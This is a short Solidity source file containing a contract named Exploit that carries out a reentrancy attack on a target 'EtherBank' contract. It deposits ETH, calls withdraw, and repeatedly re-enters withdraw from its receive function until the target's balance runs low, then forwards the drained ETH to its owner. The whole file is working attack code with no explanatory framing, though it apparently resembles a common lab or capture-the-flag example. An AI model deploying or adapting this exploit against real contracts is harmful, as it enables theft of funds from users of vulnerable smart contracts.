// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

contract Exploit {
    address public owner;
    IEtherBank public target;
    uint256 private depositAmount;
    bool private attacking;

    constructor(address _target) payable {
        owner = msg.sender;
        target = IEtherBank(_target);
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        depositAmount = address(this).balance;
        require(depositAmount > 0, "no funds");

        attacking = true;
        target.deposit{value: depositAmount}();
        target.withdraw();
        attacking = false;

        // send all ETH held by this contract to owner
        uint256 bal = address(this).balance;
        if (bal > 0) {
            (bool ok, ) = owner.call{value: bal}("");
            require(ok, "payout failed");
        }
    }

    receive() external payable {
        if (attacking && address(target).balance >= depositAmount) {
            target.withdraw();
        }
    }
}
